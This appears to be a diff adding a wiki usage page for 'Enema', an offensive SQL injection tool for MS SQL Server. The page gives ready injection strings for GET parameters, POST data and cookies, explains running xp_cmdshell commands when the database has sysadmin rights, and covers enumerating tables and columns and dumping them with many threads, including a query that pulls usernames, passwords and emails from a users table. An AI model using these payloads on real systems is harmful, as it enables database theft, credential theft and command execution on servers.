@@ -1,0 +1,90 @@
+#labels Enema,SQL,Usage
+---------------
+===SQL injection in GET requests===
+---------------
+For example vulnerable script - _http://site.com/vuln.aspx?id=1'_
+
+`==> Unclosed quotation mark after the character string '1'`
+
+If injection type is Error-based then ready for injection string using Enema will be - _http://site.com/vuln.aspx?id=1' and 1=[[sub]]--_
+
+For UNION-based sql injections you can use this url - _http://site.com/vuln.aspx?id=1' union all select null,null,[[sub]],null--_
+
+What is *[[sub]]*? This variable tells to our program where inject SQL Substring.
+
+If database rights - sysadmin, you can use this urls:
+_http://site.com/vuln.aspx?id=1' and 1=[[sub]];[[cmd]]--_
+
+What is *[[cmd]]*? This variable tells to our program where inject xp_cmdshell commands, declarations etc...
+
+Why variable [[sub]] used too? - For retrieving xp_cmdshell output.
+
+Also you can use only [[cmd]] variable if injection blind, and you not interested in results.
+
+---------------
+===SQL injection in POST requests, Cookies===
+---------------
+All the same, with a little correction.
+For example vulnerable script - _http://site.com/login.aspx_
+Post data: _username=admin'&password=test123_
+
+`==> Unclosed quotation mark after the character string 'admin'`
+
+1. Put _http://site.com/login.aspx_ to URL.
+
+2. Select method = _POST_.
+
+3. Post data should be - _username=' and 1[[eq]][[sub]]--&password=test123_
+
+What is *[[eq]]*? This is equal symbol - "=". This is important, use [[eq]] instead of "=" in user-defined post data, and use "%3b" instead of ";" in user-defined Cookie value.
+
+For example Cookie string - _session=12345; uid=32321; cartid=' and 1=[[sub]]*%3b*[[cmd]]--; reffid=005541_
+
+If variable [[sub]] or [[cmd]] found in cookies, then Enema perceives attack as injection in cookies.
+---------------
+===Buttons and methods on tab "db structure"===
+---------------
+*Tables* - get tables from current database.
+
+*Count* - select table and click. You will recieve number of rows in selected table.
+
+Drag table or tables from left field and drop it in right. *Columns* - get columns from all tables in right field.
+
+*...* (button) - get databases
+
+*`Supported tables extraction methods:`*
+
+1. not in([array])
+
+2. not in([substring]) - *multithreaded*
+
+*`Supported columns extraction methods:`*
+
+1. not in([array])
+
+2. not in([substring]) - *multithreaded*
+
+3. by ordinal_position - *multithreaded*
+
+*`Supported database extraction methods:`*
+
+1. not in([array])
+
+2. not in([substring]) - *multithreaded*
+
+Field "Match pattern" for exclusive cases only.
+Enema parsing sql data between "Match symbols", default match symbol is "~"
+---------------
+===Dump tab===
+---------------
+*Table* - table for dump
+
+*Columns* - columns for dump. Can be separated by ";".
+
+*Primary key* - index number, something like CustomerID, or you can create your own table and insert data for dump. (_create table tmptbl (num int identity, sqldata varchar(8000) NULL, primary key (num)); insert into tmptbl select username + "|" + password + "|" + email from users_).
+
+*From* and *To* - dump from position to position. (integer)
+
+Dumper multithreaded. I successfuly tested it up to 50 threads. Your threads depend on your internet connection :)
+
+*Important : Dumper creating thread pool for each column.*. It means if you defined 10 threads and dumping table with 3 columns, dumper will start 30 threads.
